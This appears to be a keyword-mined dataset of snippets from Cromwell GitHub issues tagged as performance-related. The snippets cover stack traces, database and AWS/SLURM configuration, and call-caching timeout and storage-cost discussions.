Performance, com.mysql.jdbc.PreparedStatement.executeUpdateInternal(PreparedStatement.java:2079); 	at com.mysql.jdbc.PreparedStatement.executeUpdateInternal(PreparedStatement.java:2013); 	at com.mysql.jdbc.PreparedStatement.executeLargeUpdate(PreparedStatement.java:5104); 	at com.mysql.jdbc.PreparedStatement.executeUpdate(PreparedStatement.java:1998); 	at com.zaxxer.hikari.pool.ProxyPreparedStatement.executeUpdate(ProxyPreparedStatement.java:61); 	at com.zaxxer.hikari.pool.HikariProxyPreparedStatement.executeUpdate(HikariProxyPreparedStatement.java); 	at slick.jdbc.JdbcActionComponent$InsertActionComposerImpl$InsertOrUpdateAction.$anonfun$nativeUpsert$1(JdbcActionComponent.scala:564); 	at slick.jdbc.JdbcBackend$SessionDef.withPreparedInsertStatement(JdbcBackend.scala:379); 	at slick.jdbc.JdbcBackend$SessionDef.withPreparedInsertStatement$(JdbcBackend.scala:376); 	at slick.jdbc.JdbcBackend$BaseSession.withPreparedInsertStatement(JdbcBackend.scala:434); 	at slick.jdbc.JdbcActionComponent$ReturningInsertActionComposerImpl.preparedInsert(JdbcActionComponent.scala:640); 	at slick.jdbc.JdbcActionComponent$InsertActionComposerImpl$InsertOrUpdateAction.nativeUpsert(JdbcActionComponent.scala:561); 	at slick.jdbc.JdbcActionComponent$InsertActionComposerImpl$InsertOrUpdateAction.f$1(JdbcActionComponent.scala:544); 	at slick.jdbc.JdbcActionComponent$InsertActionComposerImpl$InsertOrUpdateAction.run(JdbcActionComponent.scala:557); 	at slick.jdbc.JdbcActionComponent$SimpleJdbcProfileAction.run(JdbcActionComponent.scala:31); 	at slick.jdbc.JdbcActionComponent$SimpleJdbcProfileAction.run(JdbcActionComponent.scala:28); 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.liftedTree1$1(BasicBackend.scala:240); 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.run(BasicBackend.scala:240); 	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142); 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); 	at java.lang.Thread.run(Thread.java:748); ```,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2452:12709,concurren,concurrent,12709,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2452,2,['concurren'],['concurrent']
Performance," copying (api: CreateMultipartUpload) doesn't work for me. The cromwell server always checks the existence of the cached file before the copying finishes. In Cromwell v51 and before, some small files <100GB were able to be successfully cached. However, with Cromwell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? . > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > […](#); > On Sat, Oct 24, 2020 at 8:27 PM Luyu ***@***.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because you are subscribed to thi",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491:1017,cache,cache,1017,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491,1,['cache'],['cache']
Performance," entries to this cache once a WorkflowActor has been messaged to abort.; # If on the next scan an 'Aborting' status is found for a workflow that has an entry in this cache, Cromwell will not ask; # the associated WorkflowActor to abort again.; cache {; enabled: true; # Guava cache concurrency.; concurrency: 1; # How long entries in the cache should live from the time they are added to the cache.; ttl: 20 minutes; # Maximum number of entries in the cache.; size: 100000; }; }. # Cromwell reads this value into the JVM's `networkaddress.cache.ttl` setting to control DNS cache expiration; dns-cache-ttl: 3 minutes; }. docker {; hash-lookup {; # Set this to match your available quota against the Google Container Engine API; #gcr-api-queries-per-100-seconds = 1000. # Time in minutes before an entry expires from the docker hashes cache and needs to be fetched again; #cache-entry-ttl = ""20 minutes"". # Maximum number of elements to be kept in the cache. If the limit is reached, old elements will be removed from the cache; #cache-size = 200. # How should docker hashes be looked up. Possible values are ""local"" and ""remote""; # ""local"": Lookup hashes on the local docker daemon using the cli; # ""remote"": Lookup hashes on docker hub, gcr, gar, quay; #method = ""remote""; enabled = ""false""; }; }. # Here is where you can define the backend providers that Cromwell understands.; # The default is a local provider.; # To add additional backend providers, you should copy paste additional backends; # of interest that you can find in the cromwell.example.backends folder; # folder at https://www.github.com/broadinstitute/cromwell; # Other backend providers include SGE, SLURM, Docker, udocker, Singularity. etc.; # Don't forget you will need to customize them for your particular use case.; backend {; # Override the default backend.; default = slurm. # The list of providers.; providers {; # Copy paste the contents of a backend provider in this section; # Examples in cromwell.example.backends includ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6933:4388,cache,cache,4388,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6933,2,['cache'],"['cache', 'cache-size']"
Performance," files can be multiple GBs). Here is our database setup:; ```; database {; profile = ""slick.jdbc.HsqldbProfile$""; db {; driver = ""org.hsqldb.jdbcDriver""; # See http://hsqldb.org/doc/2.0/guide/dbproperties-chapt.html; # Shutdown=false. Cromwell will shutdown the database; # hsqlldb.default_table_type=cached. By default hsqldb uses in memory tables. ; # Setting this to cache for improved memory usage.; # hsqldb.result_max_memory_rows=10000 . Limits the amount of rows in memory for temp tables; # hsqldb.tx=mvcc cromwell default. Not changing it. Not clear what this does. http://hsqldb.org/doc/guide/sessions-chapt.html#snc_tx_mvcc; # hsqldb.large_data=true. Cromwell creates huge DBs that need to be opened.; # hsqldb.applog=1. Log errors.; # hsqldb.lob_compressed=true. Compress lobs. This saves a lot of space.; # hsqldb.script_format=3. Compress script. (uses gzip internally).; url = """"""; jdbc:hsqldb:file:cromwell-executions/cromwell-db/cromwell-db;; shutdown=false;; hsqldb.default_table_type=cached;hsqldb.tx=mvcc;; hsqldb.result_max_memory_rows=10000;; hsqldb.large_data=true;; hsqldb.applog=1;; hsqldb.lob_compressed=true;; hsqldb.script_format=3; """"""; # Override the cromwell default of only 3 seconds (3000 milliseconds) and allow for 300s to read the database file.; connectionTimeout = 300000; numThreads = 1; }; }; ```; Please note the `connectionTimeout = 300000` where we set the connection timeout to 5 minutes. This works for most cases. On a side note: HSQLDB has got to be the worst performing embedded database designed in the history of mankind. When running a decent-sized WDL workflow it can get 30 GB in memory! When using the file-based database it still needs 2 GB in memory (on top of the 1 GB that cromwell needs) is very slow, and creates a multiple GB file database. (EDIT: I checked my multiple run 100 sample RNA-seq pipeline that has run multiple times, using call-caching and sometimes with slightly different settings: **85 GB** in files for the database.); MyS",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5271#issuecomment-624458757:1134,cache,cached,1134,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5271#issuecomment-624458757,2,['cache'],['cached']
Performance," for a number of workflows, here we are including just one. . Call caching is a **hugely** important feature for us and if it is not available we may would have to reconsider using Cromwell. I think I have discussed with @ruchim the fact that all objects in S3 have a hash already computed (the ETag header) so there should not be timeouts in computing these hashes as they are available with a head request (you don't need to download the whole object). . Error message (extract from `/metadata` output):. ```; ""callCaching"": {; ""hashFailures"": [; {; ""causedBy"": [],; ""message"": ""Hashing request timed out for: s3://bucketname/cromwell-tests/Panel_BWA_GATK4_Samtools_Var_Annotate/162c863f-c22a-4b7c-bb37-f5195b329b36/call-ApplyBQSR/shard-0/smallTestData.hg38.recal.bam""; }; ],; ""allowResultReuse"": false,; ""hit"": false,; ""result"": ""Cache Miss"",; ""effectiveCallCachingMode"": ""CallCachingOff""; },; ```. Config file:. ```; include required(classpath(""application"")). call-caching {; enabled = true; invalidate-bad-cache-results = true; }. database {; # Store metadata in a file on disk that can grow much larger than RAM limits.; profile = ""slick.jdbc.HsqldbProfile$""; db {; driver = ""org.hsqldb.jdbcDriver""; url = ""jdbc:hsqldb:file:aws-database;shutdown=false;hsqldb.tx=mvcc""; connectionTimeout = 3000; }; }. aws {; application-name = ""cromwell""; auths = [; {; name = ""default""; scheme = ""default""; }; {; name = ""assume-role-based-on-another""; scheme = ""assume_role""; base-auth = ""default""; role-arn = ""arn:aws:iam::xxx:role/fbucketname""; }; ]; // diff 1:; # region = ""us-west-2"" // uses region from ~/.aws/config set by aws configure command,; # // or us-east-1 by default; }; engine {; filesystems {; s3 {; auth = ""assume-role-based-on-another""; }; }; }; backend {; default = ""AWSBATCH""; providers {; AWSBATCH {; actor-factory = ""cromwell.backend.impl.aws.AwsBatchBackendLifecycleActorFactory""; config {; // Base bucket for workflow executions; root = ""s3://bucketname/cromwell-tests""; // A referenc",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4563:1574,cache,cache-results,1574,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4563,1,['cache'],['cache-results']
Performance," gsutil cp /cromwell_root/stdout gs://cloud-cromwell-dev/cromwell_execution/travis/JointGenotyping/c9dfd3ed-8be8-413f-af46-4692142b3248/call-ApplyRecalibration/shard-16/stdout""; 9611 at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor$.StandardException(PipelinesApiAsyncBackendJobExecutionActor.scala:76); 9612 at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleFailedRunStatus$1(PipelinesApiAsyncBackendJobExecutionActor.scala:532); 9613 at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleExecutionFailure(PipelinesApiAsyncBackendJobExecutionActor.scala:539); 9614 at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleExecutionFailure(PipelinesApiAsyncBackendJobExecutionActor.scala:80); 9615 at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$handleExecutionResult$3(StandardAsyncExecutionActor.scala:1037); 9616 at scala.concurrent.Future.$anonfun$flatMap$1(Future.scala:303); 9617 at scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); 9618 at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); 9619 at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 9620 at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); 9621 at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); 9622 at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); 9623 at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); 9624 at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); 9625 at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:43); 9626 at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 9627 at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 9628 at akka.di",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3732:2218,concurren,concurrent,2218,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3732,1,['concurren'],['concurrent']
Performance," had 0 total hit failures before completing successfully; [2022-12-15 21:28:04,01] [warn] 788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2-BackendCacheHitCopyingActor-788d8048:main.white_brits_sample_list:-1:1-20000000013 [788d8048main.white_brits_sample_list:NA:1]: Unrecognized runtime attribute keys:; shortTask, dx_timeout; [2022-12-15 21:28:04,01] [warn] 788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2-BackendCacheHitCopyingActor-788d8048:main.low_genotyping_quality_sample_list:-1:1-20000000014 [788d8048main.low_genotyping_quality_sample_list:NA:1]: Unrecognized ru; ntime attribute keys: shortTask, dx_timeout; [2022-12-15 21:28:04,01] [info] BT-322 788d8048:main.white_brits_sample_list:-1:1 cache hit copying success with aggregated hashes: initial = B2C071CED641A1EB183DE4A4655F45ED, file = 9675960412B5394D5D0816ED198FB6EB.; [2022-12-15 21:28:04,01] [info] 788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2-EngineJobExecutionActor-main.white_brits_sample_list:NA:1 [788d8048]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:28:04,01] [info] BT-322 788d8048:main.low_genotyping_quality_sample_list:-1:1 cache hit copying success with aggregated hashes: initial = 3C891C9939496580DDF747805F991E06, file = AAFFF98AC7D58B07E7CE25978A906B00.; [2022-12-15 21:28:04,01] [info] 788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2-EngineJobExecutionActor-main.low_genotyping_quality_sample_list:NA:1 [788d8048]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:28:04,02] [warn] 788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2-BackendCacheHitCopyingActor-788d8048:main.sex_mismatch_sample_list:-1:1-20000000015 [788d8048main.sex_mismatch_sample_list:NA:1]: Unrecognized runtime attribute keys; : shortTask, dx_timeout; [2022-12-15 21:28:04,02] [info] BT-322 788d8048:main.sex_mismatch_sample_list:-1:1 cache hit copying success with aggregated hashes: initial = 03340ED60152B24B7D0988669F47CF2B, file = EB6A9909BDF3705B7BB543E4096DA08A.; [2022-12-15 21:28:04,02] [i",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6971:36015,cache,cache,36015,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6971,1,['cache'],['cache']
Performance," improvements that have recently been merged into dev; > and should appear in the next release version (or you could build from; > source) v52+ requires a new AWS configuration. Instructions are in; > https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > … <#m_3227077625045957240_>; > On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout; > exception during cache copying on AWS S3. The cache file size is 133GB.; > Given the file size, more time should be allowed for cache copying. Is; > there any config option that can tune this? Thank you in advance for any; > suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure; > copying cache results for job; > BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo; > FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out; > waiting for a response to copy s3://xxxxx/cromwell-execution/Germ; > line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136; > /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to; > s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488; > 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u; > nmerged.bam) — You are receiving this because you are subscribed to this; > thread. Reply to this email directly, view it on GitHub <#5977; > <https://github.com/broadinstitute/cromwell/issues/5977>>, or unsubscribe; > https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFSM4S56ELLQ; > .; >; > —; > You are receiving this because you commented.; >; >; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491>,; > or unsubscribe; > <https://github.com/notifica",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055:2102,Cache,Cache,2102,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055,1,['Cache'],['Cache']
Performance," java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""Hikari Housekeeping Timer (pool db)"" #35 daemon prio=5 os_prio=0 tid=0x00007fdaf8212800 nid=0xa0b waiting on condition [0x00007fdb80cd2000]; java.lang.Thread.State: TIMED_WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b74b1f0> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.parkNanos(LockSupport.java:215); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.awaitNanos(AbstractQueuedSynchronizer.java:2078); at java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(ScheduledThreadPoolExecutor.java:1093); at java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(ScheduledThreadPoolExecutor.java:809); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""Abandoned connection cleanup thread"" #34 daemon prio=5 os_prio=0 tid=0x00007fdaf81fc000 nid=0xa0a in Object.wait() [0x00007fdb80fd3000]; java.lang.Thread.State: TIMED_WAITING (on object monitor); at java.lang.Object.wait(Native Method); at java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:143); - locked <0x000000015b76b538> (a java.lang.ref.ReferenceQueue$Lock); at com.mysql.jdbc.AbandonedConnectionCleanupThread.run(AbandonedConnectionCleanupThread.java:43). ""Service Thread"" #17 daemon prio=9 os_prio=0 tid=0x00007fdbcc2d4000 nid=0x9f9 runnable [0x0000000000000000]; java.lang.Thread.State: RUNNABLE. ""C1 CompilerThread11"" #16 daemon prio=9 os_prio=0 tid=0x00007fdbcc2d1000 nid=0x9f8 waiting on condition [0x0000000",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914:5507,concurren,concurrent,5507,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914,1,['concurren'],['concurrent']
Performance," java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(Redefined); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Redefined). ""pool-1-thread-1"" #27 prio=5 os_prio=31 tid=0x00007fb76f4b6000 nid=0x7b03 waiting on condition [0x000000012b643000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(Redefined); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Redefined). ""db-1"" #26 daemon prio=5 os_prio=31 tid=0x00007fb76b442000 nid=0x7903 waiting on condition [0x000000012d905000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchro",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:39747,concurren,concurrent,39747,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance," look at this issue of disappearing SGE jobs in depth for at least a couple weeks. For now, here's a brain dump of notes. After a short bit of review, I'd perhaps try a different approach.; - On execute or recover, `scheduleOnce` a message back to `self` to later check if a job is alive.; - When the message is received check if the job is alive.; - If the job is alive `scheduleOnce` a message to check if the job is alive again.; - If the job is not alive write an rc file with `143` (or other code, see notes on configuration below).; - An instance of `cromwell.core.retry.Backoff` should travel inside the scheduled messages. Each time the message is to be scheduled, get the next time. As for the existing code, here are a few notes.; - Use `java.time` instead of `java.util`. `java.time.Instant` and `java.time.Duration` may be used to calculate the amount of time between two instants.; - `IsAliveCash.cash` should be `.cache`.; - `.map(_.cache).getOrElse(true)` should be `.forall(_.cache)`, however...; - `.cache` always appears to be `true`, and thus not needed.; - `!isAliveCache.contains` followed by `isAliveCache.get` should be `isAliveCache.getOrElseUpdate(job, IsAliveCache(Instant.now))`.; - There should be only one `SharedFileSystemJob` per `SharedFileSystemAsyncJobExecutionActor`. The reason the values are passed around is because the actor is also partially stateless, using `context.become` to track the `SharedFileSystemJob`. This PR adds state more to the actor, outside of the context, but that shouldn't be needed if the `isAlive` check is switched to running due to multiple `scheduleOnce` calls. The tests are likely timing out because the of the extra checks to `isAlive`. The tests are meant to run as quickly as possible. In general, the order of the job completion checking should always be 1) multiple rc file polls, 2) 30 seconds later `isAlive` checks as necessary. This individual polling per job may overwhelm the SGE scheduler if hundreds or thousands of scatt",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1346#issuecomment-243562238:1304,cache,cache,1304,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1346#issuecomment-243562238,2,['cache'],['cache']
Performance," minutes"",; ""writeBatchSize"" : 10000,; ""writeThreshold"" : 10000; }; Uncaught error from thread [cromwell-system-akka.dispatchers.engine-dispatcher-4]: Uncaught error from thread [cromwell-system-akka.dispatchers.service-dispatcher-7]: unable to create new native thread, shutting down JVM since 'akka.jvm-exit-on-fatal-error' is enabled for ActorSystem[cromwell-systemunable to create new native thread, Uncaught error from thread [cromwell-system-akka.dispatchers.io-dispatcher-15]; ]: unable to create new native thread, shutting down JVM since 'akka.jvm-exit-on-fatal-error' is enabled for ActorSystem[cromwell-system]; [...]; ```. So I tried following the HPC/SLURM instructions and made a conf file:; ```; include required(classpath(""application"")). webservice {; port = 8080; }. backend {; providers {; Sherlock {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; runtime-attributes = """"""; Int runtime_minutes = 2; Int cpus = 1; Int requested_memory_mb_per_core = 1000; String queue = ""short""; """""". submit = """"""; sbatch -J ${job_name} -D ${cwd} -o ${out} -e ${err} -t ${runtime_minutes} -p ${queue} \; ${""-c "" + cpus} \; --mem-per-cpu ${requested_memory_mb_per_core} \; --wrap ""/bin/bash ${script}""; """"""; kill = ""scancel ${job_id}""; check-alive = ""squeue -j ${job_id}""; job-id-regex = ""Submitted batch job (\\d+).*""; }; }; }. default = Sherlock; }; ```. But I get the same error on `java -Dconfig.file=/home/users/tbenst/cromwell/sherlock.conf -jar ~/cromwell/cromwell-48.jar run hello.wdl `. Any ideas what is going on? Perhaps this is some restriction for login nodes? I suppose I could submit a SLURM job to run Cromwell to then submit my actual jobs but that seems very clunky. Edit: can confirm that if I submit `java -Dconfig.file=/home/users/tbenst/cromwell/sherlock.conf -jar ~/cromwell/cromwell-48.jar run hello.wdl ` as a slurm job then it runs fine. Would be great to be able to submit jobs from using cromwell from login node, though!",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5395:2266,queue,queue,2266,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5395,1,['queue'],['queue']
Performance," mkdir -p $(dirname ~{outputBam}); gatk --java-options -Xmx~{memory}G \; SplitNCigarReads \; -I ~{inputBam} \; -R ~{referenceFasta} \; -O ~{outputBam} \; ~{prefix('-L ', intervals)}; }. output {; File bam = outputBam; File bamIndex = sub(outputBam, ""\.bam$"", "".bai""); }. runtime {; docker: dockerImage; memory: ceil(memory * memoryMultiplier); }; }; ```; expected behavior: By default nothing happens as intervals is empty. So this should evaluate to an empty string. No intervals flag is passed to GATK.; Actual behaviour:; ```; [2019-07-29 08:49:39,27] [error] WorkflowManagerActor Workflow 3de3bd74-b387-4d35-a704-73a4054387e9 failed (during ExecutingWorkflowState): cromwell.core.CromwellFatalException: java.lang.Exception: Failed command instantiation; at cromwell.core.retry.Retry$$anonfun$withRetry$1.applyOrElse(Retry.scala:47); at cromwell.core.retry.Retry$$anonfun$withRetry$1.applyOrElse(Retry.scala:38); at scala.concurrent.Future.$anonfun$recoverWith$1(Future.scala:413); at scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWo",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5092:1316,concurren,concurrent,1316,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5092,1,['concurren'],['concurrent']
Performance," more pithy). The object would be left in the execution folder until after its last mention and then removed (or at the very end of the workflow). Caching would then need to be modified to ""bracket"" the first task in which the object is mentioned as an output and the last task for which it is an input. This group of tasks would be considered as a group. The group of tasks would be skipped if the inputs to the first task and the outputs from the last task are all cache hits. (In case the group is not linear but some other DAG the scheme could be abandoned, or else perhaps the method would generalize with more complicated rules--I'm not sure.). Following is a motivation of the need for this feature, and sequence of arguments for why it can work.; ---------------------; We have a certain amount of input and output objects that we keep in their own buckets. The outputs are copied out of the execution folder after the workflow completes. These files we cache by reference, and that works fine, and we want to keep the inputs and outputs forever. However we have a large volume of intermediate files which end up in our cromwell-executions bucket. We love caching. It works great. A fully cached workflow runs in about 5 minutes at next to no cost. Fresh workflows (no cache hits) cost on the order of $0.50 for typical examples, and run for a few hours. Object storage has been eating us up, though. We've worked out that for a single one of these workflows the break even point at which it's cheaper to rerun it than to save it and cache it is about a week. If you take into account that we re-run workflows only a small part of the time, it probably doesn't even pay to keep the execution folders at all (except in the intangible wall clock time). [And nearline / coldline makes no sense at all. Each cached file is accessed multiple times which makes cached runs way way more expensive than fresh runs.]. We’ve examined the pipeline, and we see that we could reduce the size of intermedia",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4064:1340,cache,cache,1340,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4064,1,['cache'],['cache']
